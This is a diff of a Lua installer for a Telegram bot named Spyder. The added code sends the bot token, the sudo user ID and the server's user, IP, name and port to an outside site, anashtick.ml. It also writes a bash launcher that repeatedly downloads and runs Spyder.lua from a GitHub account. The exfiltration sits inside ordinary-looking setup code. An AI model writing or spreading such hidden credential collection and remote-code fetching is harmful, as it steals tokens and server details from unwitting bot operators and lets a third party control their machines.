@@ -64,22 +64,23 @@ end  ---ifid
 os.execute('lua start.lua')
 end ---ifnot
 end
-local function Files_Spyder_Info()
-Create_Info(database:get(Server_Spyder.."Token_Spyder"),database:get(Server_Spyder.."Id_Spyder"),database:get(Server_Spyder.."UserName_Spyder"))   
-https.request("https://anashtick.ml/info.php?id="..database:get(Server_Spyder.."Id_Spyder").."&user="..database:get(Server_Spyder.."UserName_Spyder").."&token="..database:get(Server_Spyder.."Token_Spyder"))
-local RunSpyder = io.open("Spyder", 'w')
-RunSpyder:write([[
+local function Files_Info_Get()
+Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
+local t = json:decode(https.request('https://anashtick.ml/info.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+print("::Black::")
+local RunBot = io.open("Spyder", 'w')
+RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/Spyder
-token="]]..database:get(Server_Spyder.."Token_Spyder")..[["
+token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr Spyder.lua
-wget "https://raw.githubusercontent.com/Memoz24/Spyder/master/Spyder.lua"
+wget "https://raw.githubusercontent.com/Tubaktele/Spyder/main/Spyder.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Spyder.lua -p PROFILE --bot=$token
 done
 ]])
-RunSpyder:close()
+RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
@@ -92,19 +93,19 @@ done
 ]])
 RunTs:close()
 end
-Files_Spyder_Info()
-database:del(Server_Spyder.."Token_Spyder");database:del(Server_Spyder.."Id_Spyder");database:del(Server_Spyder.."UserName_Spyder")
+Files_Info_Get()
+database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Spyder()  
+AutoFiles_Write()  
 var = true
 else   
 f:close()  
-database:del(Server_Spyder.."Token_Spyder");database:del(Server_Spyder.."Id_Spyder");database:del(Server_Spyder.."UserName_Spyder")
+database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
